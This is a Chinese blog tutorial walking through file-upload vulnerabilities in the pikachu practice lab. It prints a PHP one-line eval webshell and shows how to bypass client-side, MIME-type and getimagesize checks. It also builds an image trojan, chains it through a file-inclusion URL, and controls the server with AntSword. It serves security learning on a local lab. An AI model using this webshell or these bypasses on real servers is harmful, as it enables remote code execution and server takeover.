---
title: 网络安全学习-文件上传
tags:
  - 网络安全
readmore: true
date: 2023-02-20 11:30:26
updated: 2023-02-20 11:30:26
---

文件上传本身是指一个功能，比如用户可以上传头像、上传资料等。如果能够上传文件，则可能存在文件上传的漏洞。

任意文件上传漏洞的产生需要满足三个条件：

1. 文件能被上传；
2. 文件能被服务器解析 (上传的文件能够被当作后端脚本处理)；
3. 能访问的到上传的文件，如果访问不到，则无法对文件进行控制，也就没有漏洞的说法。

<!-- more -->

### 环境搭建

环境使用 pikachu 的靶场，下载地址：https://github.com/zhuifengshaonianhanlu/pikachu

安装方式可自行百度，推荐使用 phpstudy 创建网站，方便快捷。

### client check

访问搭建好的 pikachu 靶场中的 Unsafe Fileupload -> client check；

#### 测试漏洞

首先我们上传一张普通的图片，可以看到提示 “文件上传成功”，并显示了文件保存的路径，这里将返回的路径与 pikachu 靶场的路径进行拼接，可以成功的访问到图片。

```bash
http://192.168.31.195/pikachu/vul/unsafeupload/uploads/avatar.jpg
```

#### 绕过漏洞

创建一个 "shell.php" 的文件，作为我们一会将要上传的一句话木马文件。

```php
<?=eval($_POST['cmd']);?>
```

此时在靶场中直接选中该文件，会弹出提示框说文件不符合要求；通过 burp suite 也能发现网站没有发送请求，所以得出结论是在前端(客户端)进行的验证。

F12 或者在网站空白处右键检查；发现表单处调用了 JavaScript 函数，这里直接给它删除掉再次上传即可上传成功。

![](http://pic.mewhz.com/blog/1-fileUpload.png)

#### 利用漏洞

成功上传一句话木马后，使用蚁剑进行连接。

蚁剑源码下载地址：https://github.com/AntSwordProject/antSword

蚁剑启动器下载地址：https://github.com/AntSwordProject/AntSword-Loader

将蚁剑源码解压后，打开启动器目录选择刚刚的源码文件，稍等片刻会成功启动。

也可以直接使用启动器下载；若遇到解压失败的情况，给予源码的文件夹所有权限即可。 

启动后，在蚁剑空白处右键，选择添加数据；

![](http://pic.mewhz.com/blog/rce-1.png)

在基础配置中的 url 地址，输入靶场中木马所在的 url；

连接密码输入 cmd，即刚刚木马中 $_POST 的参数；

![](http://pic.mewhz.com/blog/2-fileUpload.png)

单击测试连接，显示连接成功后，单击添加；

右键刚刚添加的记录，选择文件管理就可以对木马所在的服务器进行文件操作；

![](http://pic.mewhz.com/blog/3-fileUpload.png)

![](http://pic.mewhz.com/blog/4-fileUpload.png)

---

### MIME type

访问搭建好的 pikachu 靶场中的 Unsafe Fileupload -> MIME type；

#### 测试漏洞

同样上传一张图片，发现没有任何问题并且返回了上传的路径。

#### 绕过漏洞

上传一句话木马文件，发现要求了上传的文件格式，此时打开 burp suite 抓取请求，

将抓到的请求右键 ”Send to Repeater“，发送到请求模块，修改请求头中的内容类型；

![](http://pic.mewhz.com/blog/5-fileUpload.png)

把 **Content-Type: application/octet-stream** 修改成 **Content-Type: image/jpg**

通过此方法欺骗服务端，让服务端认为用户上传的是一张图片。

**MIME type** ：(现在称为“媒体类型 (media type)”，但有时也是“内容类型 (content type)”)是指示文件类型的字符串，与文件一起发送(例如，一个声音文件可能被标记为 `audio/ogg` ，一个图像文件可能是 `image/png` )。它与传统 Windows 上的文件扩展名有相同目的。

#### 利用漏洞

上传成功后，使用上述蚁剑的连接的方法访问后台。

---

### getimagesize

访问搭建好的 pikachu 靶场中的 Unsafe Fileupload -> getimagesize；

#### 测试漏洞

同样上传一张图片，发现没有任何问题并且返回了上传的路径。

#### 绕过漏洞

上传一句话木马，发现同样要求了文件后缀名格式；

##### 修改请求头

1. 同样使用 burp suite 抓包，这次除了修改请求头中的内容类型，还要修改文件的后缀名以及文件的内容；

2. 修改内容类型：把 **Content-Type: application/octet-stream** 修改成 **Content-Type: image/jpg**；

3. 修改文件后缀名，同样可以直接在上传之前进行修改：

   ![](http://pic.mewhz.com/blog/6-fileUpload.png)

4. 在文件内容的首部加上 "GIF89a"，代表该文件是 GIF89a 格式的文件：

   ![](http://pic.mewhz.com/blog/7-fileUpload.png)

5. 上传后成功显示文件的上传路径；

##### 制作图片木马

1. 选择一张可以正常显示的图片，并在该位置打开命令行；

2. 输入如下命令

   ```bash
   copy avatar.jpg/b+shell.php/a 1.jpg
   # copy 将一个或多个文件复制到其他位置
   # 第一个参数指定要复制的文件
   # /b 表示二进制文件
   # + 代表合并文件
   # /a 表示 ASCII 文件
   # 第二个参数指定新文件的文件名和路径
   ```

3. 重新上传文件，并选择新生成的文件，此时返回的连接仅仅是一个图片链接，需要配合着文件包含漏洞共同使用；

4. 打开 pikachu 靶场中的 File Inclusion -> File Inclusion(remote)，选择一张图片并观察URL，文件包含使用 filename 作为参数名，此时 php 页面会将相应到的数据作为 php 脚本执行，修改后面的参数名，构成新的 URL 为：

   ```bash
   http://192.168.31.195/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.31.195/pikachu/vul/unsafeupload/uploads/2023/02/20/19834863f3222ca9c95014848861.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
   ```

#### 利用漏洞

最后依然是使用蚁剑进行连接，只不过 URL 是文件包含中构成的新 URL。



仅供学习交流使用~
